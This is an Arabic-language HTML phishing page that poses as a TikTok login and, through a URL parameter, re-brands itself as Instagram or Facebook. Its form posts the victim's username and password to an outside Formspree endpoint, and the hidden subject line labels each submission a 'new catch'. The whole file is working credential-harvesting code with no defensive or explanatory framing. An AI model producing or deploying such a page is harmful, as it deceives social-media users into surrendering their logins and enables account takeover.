<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول آمن</title>
    <style>
        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
        .login-box { background: #111; padding: 25px; border-radius: 12px; width: 320px; border: 1px solid #222; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #fff; margin-bottom: 20px; font-size: 1.5rem; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 6px; outline: none; }
        input:focus { border-color: #555; }
        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 1rem; margin-top: 10px; }
        .footer-text { font-size: 0.75rem; color: #555; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 id="title">TikTok Login</h2>
        <p style="font-size: 0.9rem; color: #ccc;">يرجى تسجيل الدخول للمتابعة</p>
        
        <form action="https://formspree.io/f/mqaebrda" method="POST">
            <input type="text" name="Username" placeholder="الإيميل، الهاتف، أو اسم المستخدم" required>
            <input type="password" name="Password" placeholder="كلمة السر" required>
            <input type="hidden" name="_subject" id="subject" value="صيد جديد من تيك توك">
            <button type="submit" id="btn">تسجيل الدخول</button>
        </form>

        <div class="footer-text">© 2026 نظام التحقق الموحد</div>
    </div>

    <script>
        // حركة ذكية لتغيير الواجهة حسب الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const type = urlParams.get('type');
        
        if(type === 'insta') {
            document.getElementById('title').innerText = "Instagram";
            document.getElementById('btn').style.background = "linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)";
            document.getElementById('subject').value = "صيد جديد من إنستغرام";
        } else if(type === 'fb') {
            document.getElementById('title').innerText = "Facebook";
            document.getElementById('btn').style.background = "#1877f2";
            document.getElementById('subject').value = "صيد جديد من فيسبوك";
        }
    </script>
</body>
</html>
